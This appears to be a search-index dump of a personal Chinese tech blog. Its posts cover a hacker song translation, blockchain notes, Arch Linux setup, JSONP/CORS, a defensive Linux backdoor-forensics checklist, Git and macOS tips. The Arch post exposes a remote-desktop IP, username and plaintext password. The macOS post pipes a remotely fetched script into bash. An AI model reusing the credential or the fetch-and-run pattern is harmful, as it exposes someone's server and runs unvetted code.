{"pages":[{"title":"HackStyle","text":"","link":"/HackStyle/index.html"},{"title":"Toolkit","text":"","link":"/Toolkit/index.html"}],"posts":[{"title":"精确翻译黑客范歌曲 AllTheThings","text":"前段时间国内安全圈流传了一首《Hacking Style》，忽然想起来看门狗 2 里同样也有一首歌词特别有黑客范儿的 Hip Hop，叫做《All The Things》网易云链接：http://music.163.com/song?id=32231380&amp;userid=361913487 歌词放在这（这歌网易云的歌词像是谷歌翻译的，所以我进行了很多改进）： “Not every geek with a commodore 64 can hack into NASA”“不是所有拥有 commodore64 计算机的黑客都能黑到 NASA”This one’s dedicated to all the hackers这首歌是献给所有黑客的 Even out settle score quick即使平均结算速度很快My disaster recovery requires even more disks我也需要更多的磁盘才能进行灾难恢复“Put your bytes up, prove it or you forfeit”“把你的‘字节’放在上面，从而证明它或者丧失它”Got my C64 and we blew it into orbit…拿到了我的 C64 计算机，接下来把它送入轨道… M. Bison with eight straight perfects就像是拜森打了八连胜（拜森，街头霸王反派角色）Overload emotions make hate, break circuits超负荷的情绪会制造仇恨，破坏电路In case you heard, it’s a name fake service倘若你听说了，这是一个伪造的服务Optimize our runtime to escape verdicts以优化我们的运行时间，避免出现错误Got an integer scope flow而他们只得到一个整数范围流That they can’t sign却还不能进行签名Passing code, didn’t sanitize因为密码问题依然没有被消除Command lines; land mine同样的还有命令行和“地雷” So before, they’ll see me after所以在此之前，他们会看到我的存在I’m Advice dog我是忠告之犬Courage Wolf勇气之狼Plus Philosoraptor同时也是个哲学家 Don’t prove we’re human unless we really hafta除非我们愿意，不然不要费力证明我们是些普通人My team built schemes that destroyed recaptcha我的团队建立了摧毁验证码的方案Hate what they see, finish this chapter他们痛恨他们所看到的，以便完成这个篇章By the way we’re not any geeks, we hack into NASA顺便说一句我们可不是普通的黑客，我们黑到了 NASA Drink all the booze痛饮所有美酒Hack all the things黑尽一切事物Drink all the booze痛饮所有美酒Hack all the things黑尽一切事物Drink all the booze痛饮所有美酒Hack all the things黑尽一切事物Got this Vodka and this Redbull喝了这瓶伏特加兑红牛They still give me wings醉意便赐我双翼So we drink all the booze所以我们痛饮所有美酒Hack all the things黑尽一切事物Drink all the booze痛饮所有美酒Hack all the things黑尽一切事物Drink all the booze痛饮所有美酒Hack all the things黑尽一切事物 Zero through Three从 0 到 3We’re in every single ring我们处在任何一个单独的环节中I’m just waiting until my blackberry dies我只是在等我的黑莓死掉（黑莓，手机品牌）Cause I’ll replace it with a raspberry pi之后我就可以用树莓派代替了（树莓派，Linux 微型电脑）Don’t compare to this track不要和这个轨道比较It makes everything they said dull它使他们所说一切都索然无味Neutralize any threat消除任何威胁Turn Red skull to /dev/null将“红骷髅”放进/dev/null （Linux 的空设备文件）They killed virus writers that we mentioned他们杀死了我们提到的病毒作者But instead they ascended to the VXHeavens却自己登上了 VXHeavens（知名共享恶意软件的站点）To reincarnate as live wires以作为新鲜血液再生Still inside we hide ciphers in signed device drivers然而我们仍在设备驱动程序中藏了密码Which school will we hit next?接下来我们要攻击哪个学校？They didn’t learn the format他们并不熟悉这种格式So we’ve gotta printf所以我们将使用 printf（C 语言打印函数）Next step is a chin check下一步要进行的是 chin checkFreestyles that I spit best这便是我最喜欢的 FreestyleThey didn’t decrypt yet他们依然没有解密成功I crush internet MC’s in rhyme battles我却已经押韵斗争中粉碎了那些网络 MC 们Get your WiFi tackled同时解决了你的 WiFi 问题Hak5 Pineapple用的是 Hak5 的菠萝派（一种无线审计设备）I don’t think you’ll like my snapple我不认为你会喜欢我的 snapple（饮料品牌）Cause I popped it with vodka因为我在里边兑了伏特加And a cyanide capsule还有一个氰化物胶囊 We drink all the booze痛饮所有美酒Hack all the things黑尽一切事物Drink all the booze痛饮所有美酒Hack all the things黑尽一切事物Drink all the booze痛饮所有美酒Hack all the things黑尽一切事物Got this Vodka and this Redbull喝了这瓶伏特加兑红牛They still give me wings醉意便赐我双翼So we drink all the booze所以我们痛饮所有美酒Hack all the things黑尽一切事物Drink all the booze痛饮所有美酒Hack all the things黑尽一切事物Drink all the booze痛饮所有美酒Hack all the things黑尽一切事物“You know this could not be security, right?”“你知道这是不安全的，对吗”First we drink all the booze首先我们痛饮所有美酒Then we hack all the things然后我们黑尽一切事物 Then backdoor the firmware之后再通过后门打开固件On anything you bring不论你用的是什么Regardless of the hardware, service, or encoding硬件、服务还是编码Connected it to the internet只要把它连接到互联网And someone’s gonna own it就会有人拥有它This is for the pirates who clap这是送给那些鼓掌的盗版者And love the sound还有喜欢这掌声的人Attacking from the cloud我们从云端攻击Then we’re back in underground然后又来到线下There’s no masking from us now从现在开始我们不再遮掩We pop Tor nodes around the globe我们在全球范围内使用了 Tor 节点（可隐藏自己身份的网络代理服务器）Track and hunt you down以此将你追踪并抓捕Hacked on schedule, add it to your calendar安排好黑客日程，并将其写到日历上Devices online; here comes another challenger在在线设备上，又来了另一个挑战者State infiltrated, so undercover说他也已经完成渗透，看来同样是个地下高手This is for my comrades who stare at their debuggers这首歌送给那些盯着调试器的同志们（指逆向工程师）And trace every buffer他们追踪每个缓冲区Examining the code flow检查每个编码流“Haven’t been to sleep? Better pop another No-Doz”“还没有睡觉吗？不妨再服用另一片 NO-DOZ 吧”（抗疲劳药物）I think I’ll need a planet sized urn我想我需要一颗地球大小的骨灰盒Cause some men just wanna see the world burn因为有些人只想看这世界燃烧毁灭Your turn轮到你了 Drink all the booze痛饮所有美酒Hack all the things黑尽一切事物Drink all the booze痛饮所有美酒Hack all the things黑尽一切事物Drink all the booze痛饮所有美酒Hack all the things黑尽一切事物Got this vodka and this Redbull喝了这瓶伏特加兑红牛They still give me wings醉意便赐我双翼So we drink all the booze所以我们痛饮所有美酒Hack all the things黑尽一切事物Drink all the booze痛饮所有美酒Hack all the things黑尽一切事物Drink all the booze痛饮所有美酒Hack all the things黑尽一切事物Zero through three从 0 到 3We’re in every single ring我们处在每一个圆环中 Hack all the things黑尽一切事物Drink all the booze痛饮所有美酒Hack all the things黑尽一切事物Hack-hack-hack all the things黑-黑-黑尽一切事物Hack-hack all the things痛饮-饮-饮尽所有美酒Zero through three从 0 到 3We’re in every single ring我们处在每一个圆环中Hack all the things黑尽一切事物“Yeah we’ll in good luck man”‘耶我们会交好运的’Drink all the booze痛饮所有美酒Hack all the things黑尽一切事物Got this vodka and this Redbull喝了这瓶伏特加兑红牛They still give me wings醉意便赐我双翼Drink-drink-drink all the things痛饮-饮-饮尽所有一切Drink all the vodka痛饮所有伏特加And hack all the booze黑尽一切美酒Drink all the booze痛饮所有美酒Hack all-Hack all the hackers黑尽一切-黑尽一切黑客们Hack-hack-hack all the hack黑-黑-黑尽一切黑客","link":"/2020/07/23/AllTheThings/"},{"title":"Learn the Blockchain","text":"Technical terms Word Description Cryptocurrency 加密货币 Cryptographic Hash Function 密码哈希函数 (CR)Collision Resistance 哈希碰撞 Message Digest 消息摘要 Digital Commitment 数字承诺 Puzzle friendly Bitcion的机制之一 Proof of work 工作量证明 Secure Hash Algorism SHA Asymmetric encryption algorism 非对称加密 Merkle Tree 默克尔树 Merkle Proof 默克尔证明 Binary Tree 二叉树 (TX)Transaction 交易 Root Hash 根哈希 Proof of inclusion/membership 包含证明 (SPV)Simplified Payment Verification 简化付款认证 Genesis Block 创世区块 Full node 全节点 Light node 轻节点 Coinbase Transaction(Tx) 铸币交易 Distributed Consensus 分布式共识 Longest Valid Chain rule 最长合法链原则 Block Reward 出块奖励 Cryptographic Hash Function2 Features: Collision Resistance$$A \\neq\\ B$$$$H(A) = H(B)$$To avoid this situation, expanding the Value space is necessary. One solution is appending a random number After the message A, and calculating the Hash result. This feature can’t be proven by math. Collision Resistance can make a message be a Message Digest, to detect the Tamper happening. 2 Features: Hiding Irreversibility: You can not get the A value if you only know the H(A) itself. The effect of Digital Sealed Envelop: Because of the hiding feature, Your message can do the forecasting stuff. The principle of Blockchain’s miningTo prevent the input space too small to cause the Collision Resistance problem, each block message should add a random nouce number after itself. The miner should use the hash algorithm to calculate this random nonce number, and if the Hash result approach this situation.$$H(A+nonce) \\leq\\ Target$$This block can be put on the blockchain, And the calculation can be looked at as the Proof of Work Also, The design model of blockchain should be difficult to solve, but easy to verify Asymmetric Encryption AlgorithmEncryption process: A uses B’s public key to encode the message, and B uses its private key to decode it.Signature process: A uses its private key to encode the message, and B uses A’s public key to decode it. The Signature process was used when encapsulating a transaction(Tx) block, to prove the initiator of the transaction. The process of “encryption” was used when describing the number of transactions, to prove the actual transaction amount The public or private key should use a great random source to ensure its randomness. Data structure Blockchain is a linked list using a hash pointer. Blockchain uses the Merkle tree to create itself. There are two kinds of nodes to save the transaction information.Full node: Include both the Block header and the Block body.Light node: Only include the Block header(according to the SPV), like the mobile application. Every transaction should base on a theory: Who transacting, who proving When a light node wants to prove a transaction(Tx) is real, it should: Send a request to the full node, contains with the Tx’s hash. The full node uses the Tx’s hash to search the entire Merkle tree’s branch and provides the Red H() to the light node. The light node uses the Red H() and combines the currently Tx’s Hash(Green H()) to verify the hash of the block, until to the Root hash. If the verify completely right, then the transaction can be proved right either. When a light node wants to prove a transaction(Tx) is not real, it should: Send a request to the full node, contains with the Tx’s hash. The full node sorts all the blocks based on their hash values and returns Tx’s before and after blocks hash to the light node. The light node calculates the Block Hash which combines the before and after block until to the root hash, if the root hash is the same as the current one, then this transaction is unreal(Because this transaction never exists, so the hash wasn’t changed).On the contrary, if the transaction truly existed, the result of the block hash around the Tx, mustn’t be the current one. ProtocolBasic TheoryAny type of token should have two sides features: Authentication of the token’s issuerTo ensure the token’s reality Transaction Log(Release Code, Transaction information, etc…)To ensure the token was created by the issuer, not the copying. Each transaction has two ‘inputs’ and 1 ‘outputs’: Inputs: Coin’s source and Sender’s public key Outputs: Receiver’s public key The coin’s source ensures this transaction’s reality.The sender’s public key ensures the sender is not fake. (But attention, this public key comes from the Coinbase Block, not the sender itself) The receiver’s public key enlights this transaction’s hash pointer. (transfer to whom). A block always encapsulates many transactions(Tx), all of these transactions combine into a block as a Merkle tree, and the quantity of these transactions is called the block’s height. A full node block has two parts of it: Block header, Block body The Block header was made up of these below things: Blockchain version Hash of the previous block header. (Hash pointer) Merkle tree hash target(nBits) nonce ConsensusA main feature of blockchain is [[Distributed Consensus]]In the Bitcoin system, if it wants to reach the distributed consensus, the system must consider the membership of all nodes.It can not make any decisions by the number of accounts, cause it may lead to the [[Sybil Attack]].So, using the Calculating power(By letting the miner calculate the nouce, “solve the problem”) to measure the membership is a better way to reach consensus. Longest Valid Chain RuleThe blockchain tends to let the longest chain be the main chain.If this situation happens(like the image below): A transfers $5 to B, then A transfers the same money to the fake A(A’), it may lead to the [[Forking Attack]], but if there is another transaction after the A to B Tx, according to the longest chain rule, the attack couldn’t happen. However, If two valid blocks make the chain forked, then the blockchain would choose the smaller delay one as the main chain. And the other block will be orphaned, called the Orphan block. [[Selfish Mining]] is also follow the Longest Valid Chain Rule. AchieveThis is a piece of classic block information: UTXO A full node also can do the [[UTXO]](Unspent Transaction Output) stuff. Mining Theory The Bitcoin system is always waiting for 6 confirmations to confirm a transaction(6 transactions before) is irrevocable. Miner will get the reward by mining(package the block, solve the difficulty), the reward contains two parts: Block Reward Bitcoin is secured by mining, mining is better than voting by the membership.The Bitcoin system regulates that Every 21000 blocks the block rewards be decreased by half. On average, the Bitcoin system will create a block per 10 minutes, which means 21000 blocks will cost 4 years, which means every 4 years the Block Reward will be decreased by half. Although the Block Reward is decreasing, the value of Bitcoin itself increasing year by year. So the motivation for mining is also sufficient. The Bitcoin system always adjusts the target difficulty to make the average Block time to be 10 minutes every block. Gradually, the trend will become a Geometric Series, and the total BTC is stable: 21000000 BTCIt means that there is half of BTC at least has been mined in past. Transaction FeeEach transaction always satisfies this relation:$$Total\\ Inputs \\geq Total\\ Outputs$$For example, if A wants to transfer 1 BTC to B and B can only receive 0.99 BTC, The 0.1 BTC is the Transaction Fee to pay for the miner. Mining Distribution Every mining action can seem like a [[Bernoulli Trail]], these Bernoulli Trail constitute the Bernoulli Process(A sequence of independent Bernoulli trials)The Bernoulli Trail’s memoryless feature guarantees the blockchain’s fairness, imagine that a node has the 10 times calculating power of another one, if the system is memorable, the advantage of the high power node will expand unlimitedly, then the weak one has no chance to defeat it ever. Because mining blocks is a low probably process, all the mining actions can seem like a [[Poisson Distribution]]. From a global perspective, every block time of a blockchain is an [[Exponential Distribution]]. If the past behavior will not affect to the future’s, it called Progress Free Guarantee the Blockchain difficulty demandBecause these years, too many miners mining the block to guarantee the Blockchain difficulty demand, causing the nonce is a 32bits non-symbolic integer, so we could adjust the Merkle root hash and time(cause the transaction no need to record a specific time) to increase the difficulty. Legality of transactionEvery transaction has Input scripts and Output scripts. When the previous transaction’s Output Scripts stitch with the current transaction’s Input Scripts, and the scripts successfully run, which means the current transaction is legal. NetworkThe Bitcoin system is based on the application layer in the network, and it uses P2P(Peer to Peer) Overlay Network in its network layer. Bitcoin’s network is simple, and robust, but not efficient. When a node receives a message, it will “flood” to other neighbor nodes. (The neighbor is a logical concept, not a real geographic neighbor) The Bitcoin network follows the Best-effect Delivery standard. When a transaction wants to get into Blockchain, it will be joined into an aggregate by a node.","link":"/2022/08/14/BlockLearn/"},{"title":"Arch Linux 全流程安装纪实","text":"Tips:123456789101112131415161718chsh -s /bin/zshrdesktop 192.144.238.188 -u administrator -p 0Xiao4Sheng2Ye6prime-run vboxmanage startvm &quot;Win10&quot; --type guiarchlinux-java statusproxychains systemsettings5radeontopnvidia-smilspci | grep -E 'VGA|3D'HTTP_PROXY=127.0.0.1:1089HTTPS_PROXY=127.0.0.1:1089sudo balooctl disablectrl+z# 将当前进程放到后台挂起bg# 将挂起进程放到后台执行fg #将后台执行进程放到前台执行 2021 Archlinux双系统安装教程（超详细） - 知乎以官方Wiki的方式安装ArchLinux | viseator’s blog 0x00.安装前期准备 将Arch的镜像安装到安装介质中 使用Arch启动盘开机启动安装程序 使用fdisk/cfdisk进行分盘可以使用lsblk查看分盘情况 0x01.相关引导设置创建引导分区1mkfs.fat -F32 /dev/引导分区 创建根分区1mkfs.ext4 /dev/根分区 挂载分区12345678# 创建/mnt/boot文件夹mkdir /mnt/boot# 挂载引导分区mount /dev/引导分区 /mnt/boot# 挂载根分区mount /dev/根分区 /mnt 0x02.联网连接无线网络 使用iwctl进入iwd模式，并依次使用以下命令1234567891011121314# 寻找当前可使用网卡device list# 使用相应网卡进行网络扫描station wlan0 scan# 显示已经扫描到的网络station wlan0 get-networks# 连接选中的网络，并输入密码station wlan0 connect 选中的网络# 退出exit 更改系统时间1timedatectl set-ntp true 0x03.安装基本系统及组件改变镜像源1234567891011# 进入镜像源文件夹vim /etc/pacman.d/mirrorlist# 添加以下镜像源# 清华大学Server = https://mirrors.tuna.tsinghua.edu.cn/archlinux/$repo/os/$arch## 163Server = http://mirrors.163.com/archlinux/$repo/os/$arch## aliyunServer = http://mirrors.aliyun.com/archlinux/$repo/os/$arch 安装基本系统1pacstrap /mnt base base-devel linux linux-firmware dhcpcd 生成自动挂载分区的文件12345# 生成自动挂载分区的文件genfstab -L /mnt &gt;&gt; /mnt/etc/fstab# 可以查看确定相关生成的文件cat /mnt/etc/fstab 进入安装的系统本身1arch-chroot /mnt （可选）如果安装的Arch Linux属于双系统123456789101112131415# 在已经安装好的系统内执行# 安装必要的Bootloaderpacman -S os-prober grub efibootmgr# 编辑相关配置文件，并取消如下命令的注释vim /etc/default/grub# GRUB_DISABLE_OS_PROBER=false# 部署探测工具，执行这步前需确定引导分区依旧被挂载着# mount /dev/引导分区 /mnt/boot 被执行过了grub-install --target=x86_64-efi --efi-directory=/boot --bootloader-id=Arch# 部署探测配置文件grub-mkconfig -o /boot/grub/grub.cfg 0x04.进入系统后需要进行的设置设置时区12ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtimehwclock --systohc 安装必要安装的安装包1pacman -S neovim dialog wpa_supplicant ntfs-3g networkmanager netctl 设置locale语言选项1234567891011# 编辑相关文件vim /etc/locale.gen# 去掉en_US zh_CN的各个utf8的注释# 生成相关语言设置locale-gen# 创建默认语言配置文件，并向其中写入如下配置vim /etc/locale.confLANG=en_US.UTF-8 更改Linux系统的通用设置1234567891011121314151617181920# 更改/etc/hostnamevim /etc/hostname# 更改hosts文件vim /etc/hosts127.0.0.1 localhost::1 localhost127.0.1.1 myhostname.localdomain myhostname# 更改root密码passwd# 建立新账户，并更改改用户的密码useradd -m -G wheel resek4passwd resek4# 对建立的新用户进行sudo权限组的设置EDITOR=vim visudo# 找到 # %wheel 回车这行，删除注释 设置网络12345# 使能系统开机启动项systemctl enable --now NetworkManager# 设置wifinmtui 安装yay技术|初级：如何在 Arch Linux 中安装 Yay AUR 助手yay 指南: 2. 代理问题 123456789101112131415cd /optsudo git clone https://aur.archlinux.org/yay.git# 寻找组id resek4# 更改yay所有权sudo chown -R debugpoint:users ./yay# 进入yay目录cd yayexport GO111MODULE=onexport GOPROXY=https://goproxy.cnmakepkg -si 安装显卡驱动1pacman -S xf86-video-amdgpu nvidia nvidia-utils Display Server1pacman -S xorg Display Manager1pacman -S sddm 设置开机启动 1systemctl enable sddm","link":"/2022/10/26/Arch%20Linux%20%E5%AE%89%E8%A3%85%E6%B5%81%E7%A8%8B/"},{"title":"关于 JSONP 及 CORS 绕过同源策略的原理解释","text":"JSONP 跨域 JSONP 的全名叫做 JSON Padding 其出现的目的不是为了解决跨域问题，而是在 HTML 中的 Javascript 调用出现的历史遗留问题1&lt;script src=http://127.0.0.1/func.js?call=callfunc&gt;&lt;/script&gt; 这样形式的 src 远程调用，会自动绕过同源策略的限制，直接访问远程的 func.js 文件中的 callfunc 函数，并供 JS 在后续解析为 JSON 格式进行返回 而之所以叫 JSON Padding，是因为例如如下的简单实现，访问完远端 JS 文件中的 callfun 函数后（或称之为 API 后），远程的内容返回到该 HTML 文件的格式为使用 JSON 的数据封装（例如这种格式：callback({&quot;name&quot;:&quot;hax&quot;,&quot;gender&quot;:&quot;Male&quot;})） 1234567891011&lt;html&gt; &lt;body&gt; &lt;div&gt; receive &lt;span id=&quot;qwerty&quot;&gt; &lt;/span&gt; &lt;/div&gt; &lt;/body&gt; &lt;script&gt; function callfun(data) {document.getElementById('qwerty').innerHTML = data; } &lt;/script&gt; &lt;script src=&quot;http://127.0.0.1:10010/js?call=callfun&quot;&gt; &lt;/script&gt;&lt;/html&gt; CORS 跨域CORS 是服务端的跨域设置，因为同源策略的原因，浏览器会限制跨域的 HTTP 请求，当跨域访问发起时，浏览器会使用 OPTIONS 方法发起一个预检请求（preflight request） ，待服务器确认可以访问后，再发送实际跨域请求。 跨域请求可能会用到如下 HEADER 头： origin 预检请求（或实际请求）的原站名称 Access-Control-Request-Method 告诉服务器跨域请求会用到的方法 Access-Control-Request-Headers 告诉服务器会带的 HEADER 头 而如果服务器同意跨域，则会向客户端发起如下跨域响应： Access-Control-Allow-Origin 用于响应预检请求，服务器允许跨域的 URI Access-Control-Allow-Methods 用于响应预检请求，实际请求的允许的 HTTP 方法 Access-Control-Allow-Headers 用于响应预检请求，指明实际请求允许携带的 HEADER Access-Control-Expose-Headers 服务端自定义的 HEADER 只有在这里设置，客户端才能正常访问 Access-Control-Max-Age 预检请求的缓存时间 Access-Control-Allow-Credentials 如果请求中有 credentials=true 而服务端的这个 HERDER 却没有设置为 true 的时候，浏览器是不会把服务器返回的数据发回给请求者","link":"/2022/10/03/JSONP%E8%B7%A8%E5%9F%9F/"},{"title":"Linux 关键文件安全性排查(红蓝对抗)","text":"常用工具后门检测工具 chkrootkit rkhunter 系统急救恢复、后门分析取证 LiveCD 监控和告警任意系统文件的更改（IDS） Tripwire 配置文件排查Linux 开机自启![[Linux技巧#Linux开机自启动]] ``/etc/fstab` 磁盘被手动挂载之后都必须把挂载信息写入/etc/fstab 这个文件中，否则下次开机启动时仍然需要重新挂载。 shell 环境变量![[Linux环境变量]] 定时任务 crontab![[Linux原生命令#crontab]] SUID 排查![[SUID后门]] SSH 后门排查rpm 包完整性校验12rpm -Vf 'type sshd' 'type ssh'//S = 大小 / M = 权限 / 5=MD5 / T=时间 / L=链接 获取 sshd 进程 pid 并跟踪系统调用1strace -o out.txt -ff -p pid 获取 ssh 进程 pid 传给 strace 进行监控12ps -ef | grep -vE 'sshd|grep' | grep ssh | awk '{print $2}' |xargsstrace -o out.txt -f -p 2&gt;&amp;1 通过文件操作特征跟踪后门1grep open out.txt\\* | grep -e APPEND pam 后门排查pam 配置文件检查12stat /etc/pam.d/sshdcat /etc/pam.d/sshd so 文件加载排查 so 文件是 Linux 下的程序函数库,即编译好的可以供其他程序使用的代码和数据 12ps -ef |grep sshd |grep ptspmap pid |grep security sshd 进程操作跟踪12strace -o out -ff -p pidcat out\\* |grep APPEND ssh 公钥排查公钥文件配置 /etc/ssh/sshd\\_config 是 sshd 的配置文件 1grep AuthorizedKeysFile /etc/ssh/sshd\\_config 公钥文件搜索1find / -name authorized\\_keys 文件属性及内容1stat authorized\\_keys 预加载后门排查系统环境变量检查 LD\\_PRELOAD，是个环境变量，用于动态库的加载，动态库加载的优先级最高，一般情况下，其加载顺序为:LD\\_PRELOAD&gt;LD\\_LIBRARY\\_PATH&gt;/etc/ld.so.cache&gt;/lib&gt;/usr/lib当调用一些外部库的函数时，如果通过动态链接库 LD_PRELOAD 预加载另一个同名的函数，其使用的就是 LD_PRELOAD 生成的库文件，这样就会造成劫持。这个劫持当然首先可以想到的是[[提权]]，其次其也可以用于软件破解和功能增加。 12echo $LD\\_PRELOADunset LD\\_PRELOAD 绕过后门 hook 隐藏1cat /etc/ld.so.preload 跟踪文件系统调用12./strace -f -e trace=file /bin/catacess(&quot;/etc/ld.so.preload&quot;, R\\_OK) 后门配置文件清理12lsattr /etc/ld.so.preloadecho &gt; /etc/ld.so.preload strace 后门排查 strace 是一个可用于诊断、调试和教学的 Linux 用户空间跟踪器。我们用它来监控用户空间进程和内核的交互，比如系统调用、信号传递、进程状态变更等。 系统进程筛查 进程名称、命令参数 strace 跟踪12strace -o out.txt -ff -p pid调用内核ptrace特性来实现功能 alias 命令排查module 后门排查中间件配置排查 控制器及模块加载配置 模块文件排查 文件修改时间排序 strings evil.so |grep -e exec 已加载模块确认pamp -q pid |grep auth 内核后门排查驱动加载12lsmod / modinfo / modprobe -lcat /proc/modules 网络层排查12正向: nmap -sV -PN -T4 -p-反向：tcpdump -i eth0 src host hostname -w send.cap 系统文件排查12linux PE / LiveCD (Porteus)fdisk -l /mount /dev/mapper/VolGroup 常见目录驻留文件及目录123/etc/crontab/etc/init.d/etc/rc.local 隐藏文件及目录123/tmp/.evil/tmp/ ./ 可写可执行权限123/tmp/var/tmp/dev/shm","link":"/2021/05/11/Linux%E5%85%B3%E9%94%AE%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%90%8E%E9%97%A8%E6%8E%92%E6%9F%A5/"},{"title":"GIT:A boon for open-source developers who need to collaborate on code.","text":"Local Git ConfigCreate the Encrypted connection Generate the SSH key1ssh-keygen -t rsa -C &quot;[Email on Github]&quot; Put the public key(.pub) to the GitHub settings Verify the connection’s available Initial the Git configuration12git config --global user.name &quot;name&quot; //你的GitHub登陆名git config --global user.email &quot;123@126.com&quot; //你的GitHub注册邮箱 (Optional) Git configurationsGit proxy settings12345678910# View all of the proxy settingsgit config --global https.proxy# Set the proxygit config --global http.proxy [http://127.0.0.1:1080](http://127.0.0.1:1080/)git config --global https.proxy [https://127.0.0.1:1080](https://127.0.0.1:1080/)# Cancel the proxy settingsgit config --global --unset http.proxygit config --global --unset https.proxy Ignore the files Add the filename which should be ignored to the .gitignore file. However, the files’ names will also be exposed in the .gitignore file. Therefore, if we want to ignore the files, we should add the file name(or the pathname) to the .git/info/exclude file. Normal developConcept Workflow If you want to upload some codes to Github, you need to create a repository on Github before you use the git commands below. 1234567891011121314# Simplist git upload flowgit initecho &quot;Something&quot; &gt;&gt; README.mdgit add README.mdgit commit -m &quot;something&quot;git remote add origin [ssh@your.repo]git branch -M main # -M specifies the branch is a main branchgit push -u origin main # -u makes the after git push no need to specify the specific remote address# View the git loggit log# View the git statusgit status Open Source software developing flowGit Flow git branch1234567891011# Checkout all of the branchesgit branch# Delte a branchgit branch -d [branch_name]# Switching the current branchgit checkout [branch_name]# Create a new branch and Switch to itgit checkout -b [branch_name] git commit1234# Add a commit about this changinggit commit &quot;[something]&quot;# Edit the added commit contents but hasn't pushed to the remotegit commit --amend git rebase12345# Rebase the current branch to the other branch's lastest versiongit rebase [branch_name]# If there's a conflict when you're branching, continue the operation(you should solve the conflict first)git rebase --continue git merge12345# Merge another branch's lastest version to the current branchgit merge [branch_name]# combine all of the commits to one commit, and merge it to the current branchgit merge --squash [branch_name] git revert12# Revert a single operation by commit_idgit revert [commit_id] git reset123456789# Reset your local git to a history pointgit reset [file]|[history point]git reset --soft [file]|[history point]git reset --mixed [file]|[history point] # Defalutgit reset --hard [file]|[history point]# Reset the local git to the previous version, every ^ means a previous versiongit reset HEAD^ git reset HEAD~1 git tag123456789101112131415# View all of the tagsgit tag -n# Use git log --decorate to confirm the tag's belonginggit log --decorate# Create a tag to a commit at your local gitgit tag [tag_name]# Create a tag containing the contentgit tag -am [content] [tag_name]# Push the tagsgit push origin --tags # Push all of the tagsgit push origin tag [tag_name] # Push a certain tag git restore12345# Recover a file but not adding to the stagegit restore [file_name] # or we can use &quot;git checkout [file_name]&quot;# Revoke the file adding from the stagegit restore --stage [file_name] git cherry-pick12# Merge another branch's certain commit to the current branchgit cherry-pick [commit_id]|[branch_name] TipsThe difference between merge/rebase/squash The common merge could lead to the situation If we use different parameters rather than the common one. --squash could combine all of the commits to be a single one, which makes the git timeline looks better. Use the rebase as possible as we can(except the public branch) Though the merge is more convenient to use, however, if we always use squash to merge the branches, the author of the main branch will be full of the name of the maintenance personnel merge should be used at the main branch, and rebase should be used at the feature branch The difference between revert/reset The public branch can not tolerate the “Rollback” thing, therefore the public branch mustn’t use the reset command. We can use the revert instead of it. revert will add a new commit when we use it to revoke an operation. When we use the reset command to roll back to the previous git point, it is necessary to use the push -f to force push our local git to the remote side. The remote git side can not tolerate any differences between the remote and the local git, so whether we use the reset or the rebase command, we should push -f.","link":"/2023/01/10/Git/"},{"title":"MacOS Custom Settings","text":"命令行看星战1telnet towel.blinkenlights.nl Homebrew三条命令安装 Homebrew 1/bin/bash -c &quot;$(curl -fsSL https://cdn.jsdelivr.net/gh/ineo6/homebrew-install/install.sh)&quot; 1echo 'eval &quot;$(/opt/homebrew/bin/brew shellenv)&quot;' &gt;&gt; ~/.zprofile 1eval &quot;$(/opt/homebrew/bin/brew shellenv)&quot; git当远程有 git 的时候本地只需要 1234git config --global user.name &quot;用户名&quot;git config --global user.email &quot;邮箱&quot;ssh-keygen -t rsa -C &quot;邮箱&quot; 即可在本地生成一个 .ssh 密钥文件，将 id_rsa.pub 里的内容复制到 github 上的个人设置里就行了 PD去这个链接去安装 pdhttps://www.parallels.com/hk/products/desktop/welcome-trial/去这个链接去安装 pd runnerhttps://macwk.com/soft/pd-runner 正常安装一个 pd 上的 win11，然后当打开这个系统的时候，pd 会提示让你注册你正常注册，然后会进入试用期 运行 pd runner，以后用 pd runner 启动 win11 就好了 office去百度云网盘里边去装 mac 的 office“mac 版 Office2019_兼容 M1 芯片” 签名验证导致 dock 栏跳（软件启动慢）去 /etc/hosts 里更改 hosts，加上一条以避免验证 1127.0.0.1 ocsp.apple.com 快捷键显示隐藏文件Command+Shift+. 截图及录屏Command+Shift+4/5 预览 Preview.app基础使用在预览中可以进行裁剪，绘画，签名，移动至其他设备等 在预览中查看格式化 manual page 信息在环境变量上加上 12.zshrc中pdfman='func(){man -t $1|open -fa Preview.app};func' 之后便可以使用 pdfman ls 来用预览来展示 ls 的详细信息了 Option 的作用查看各种硬件的详细信息使用 Option+左键单击wifi，蓝牙，可以展示其硬件详细信息 移动文件除了 Ctrl+c 后 Ctrl+Alt+v 来游动文件还可以在复制后，在目标文件夹下，使用 Option+右键单击 来移动文件 同时开多窗口打开文件夹在同一个文件夹下，多选多个文件夹，然后 Option+右键单击，点击打开多个窗口即可 1/4 格音量、亮度调整按住 Shift+Option+音量调整/亮度调整 可以 1/4 格的调整音量 多模式缩放窗口按住 Option 然后将鼠标移动到绿色的缩放按钮上，即可展示不同模式的缩放选择 程序坞上在程序坞上面 Option+右键单击 即可 隐藏其他应用 强制退出应用 在打开多任务 Dock 的时候可以直接按住 Option 来点掉多个桌面的 X，不用来回晃动了 使用 jenv 快速进行 linux 多版本 java 配置12345678910111213141516171819# 查看当前安装jdk路径/usr/libexec/java_home -V# 安装jenvbrew install jenv# 在环境变量里边添加上：eval &quot;$(jenv init -)&quot;# 添加不同jdk版本到jenv路径jenv add /Library/Java/JavaVirtualMachines/jdk-17.0.2.jdk/Contents/Homejenv add /Library/Java/JavaVirtualMachines/jdk-15.0.2.jdk/Contents/Home# 查看当前已配置到jenv的jdk版本jenv versions# 切换jdk版本，例如切换到jdk15jenv local 15 双击一个文件使用 Vim 打开使用热键窗口打开1234567891011on run {input, parameters} tell application &quot;iTerm&quot; tell current window create tab with profile &quot;HK&quot; tell current session write text (&quot;nvim &quot; &amp; quote &amp; POSIX path of input &amp; quote &amp; &quot;; exit&quot;) end tell end tell display notification &quot;🎉&quot; &amp; quote &amp; POSIX path of input &amp; quote &amp; &quot; has been opened at the iTerm Hotkey window~&quot; end tellend run 使用窗口打开使用 Automator 创建一个 AppleScript ，然后写入如下命令，以后所有想要用 Vim 打开的文件全部使用这个 Application 打开就行了 12345678910on run {input, parameters} tell application &quot;iTerm&quot; create window with default profile tell front window tell current session write text (&quot;nvim &quot; &amp; quote &amp; POSIX path of input &amp; quote &amp; &quot;; exit&quot;) end tell end tell end tellend run 不传输路径 12345678910on run {} tell application &quot;iTerm&quot; create window with default 